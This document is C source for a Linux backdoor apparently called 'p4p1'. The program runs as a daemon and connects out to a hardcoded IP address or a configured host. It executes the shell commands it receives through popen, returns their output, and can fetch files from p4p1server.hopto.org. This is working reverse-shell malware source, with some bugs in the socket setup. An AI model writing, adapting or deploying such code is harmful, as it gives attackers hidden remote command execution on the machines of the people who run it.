#include "p4p1-h_linux.h"

int main(int argc, char *argv[])
{
	if(argc <= 1){
		skeleton_daemon();
	}

	int portno;     //number of port
	char ip[16];
	char ipchar[16];
	char portchar[6];   //Char retrieved from .cfg file
	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
	FILE * fip = fopen("ip.cfg", "r");

  	if(fp == NULL){
    		portno = 4441;
  	} else {
    		int i = 0;
    		char c;

    		while((c = fgetc(fp)) != EOF){
      			portchar[i] = c;
      			i++;
		}
    		portchar[i+1] = '\0';

    		portno = atoi(portchar);
  	}

	if(fip == NULL){
		strcpy(ip, "86.247.205.102");      //If no file set up default ip to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
			ipchar[i] = c;
			i++;
		}
		ipchar[i] = '\0';

		strcpy(ip, ipchar);

		fclose(fip);
	}

	printf("%s:%d", ip, portno);

  	while(1) {

		FILE * pPipe;
    		int bytesSent, bytesRecv, cn;
    		struct sockaddr_in server, client;
    		char sessionID[5] = "";					// Session id given by serv
		char buf[BUFSIZE] = "";					//buf
    		char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id
		char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";

    		client.sin_family = AF_INET;
    		client.sin_port = htons(portno);
    		server.sin_addr.s_addr = inet_addr(fip);

    		int *pbs = &bytesSent;
    		int *pbr = &bytesRecv;

    		//Start up socket and try connecting.
    		int s = socket(AF_INET, SOCK_STREAM, 0);
    		if(s == -1){
      			break;
    		}

    		do{
			cn = connect(s, (struct sockaddr *)&client, sizeof(client));
    		} while(cn == -1);

    		if(cn != -1){
			*pbr = SOCKET_ERR;
			//Receive the session id

	    		while(*pbr == SOCKET_ERR){
				*pbr = recv(s, buf, BUFSIZE, 0);
					if(*pbr == 0){
						break;
					}

					if(bytesRecv < 0){
						return -1;
					} else {
						sessionID[0] = buf[0];
						printf("sid = %c", sessionID[0]);
						bzero(buf, BUFSIZE);
					}
			}
			// Send ui if no session id
			if(sessionID[0] == '0'){	//if session id is 0 that means you are working with nc
				*pbs = send(s, ui, sizeof(ui), 0);
			}
    		}

    		while(cn != -1){
			if(sessionID[0] == '0'){
				*pbs = send(s, prompt, sizeof(prompt), 0);
			}

			*pbr = SOCKET_ERR;

			while(*pbr == SOCKET_ERR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){

						if(iscommand(buf[0]) == 2){	// exit command
							bzero(buf, BUFSIZE);
							goto close;
						} else if (iscommand(buf[0]) == 1) { //file download command
							bzero(buf, BUFSIZE);
							download();
							strcpy(buf, "file downloaded from p4p1server.hopto.org\n");
						} else {
							bzero(buf, BUFSIZE);
						}

					} else {
						if( (pPipe = popen( buf, "r" )) == NULL ){
							bzero(buf, BUFSIZE);
							strcpy(buf, "error in command");
							printf("error in cmd\n");
						} else {
							bzero(buf, BUFSIZE);
							int i = 0;
							char ch;
							while((ch = fgetc(pPipe)) != EOF){
								buf[i] = ch;
								i++;
								if(i == BUFSIZE){
									break;
								}
							}
						}
					}
				}
			}

			/*
			 * Send back output
			 **/
			*pbs = send(s, buf, BUFSIZE, 0);
			bzero(buf, BUFSIZE);

    		}// end cn while loop

    		close:END; //ending label
		pclose(pPipe);
		close(s);
  	}

  return 0;
}
